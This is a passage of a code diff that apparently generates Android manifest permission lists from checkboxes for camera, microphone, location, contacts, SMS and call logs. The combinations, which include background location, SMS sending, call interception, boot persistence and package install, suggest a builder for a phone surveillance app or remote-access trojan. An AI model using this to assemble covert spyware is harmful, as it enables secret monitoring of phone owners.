+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            ` 
+        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+
+            ` 
+        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
+            ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
+            ` 
+        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
+        }
+        //if four are checked 
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var Permissionsrules = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
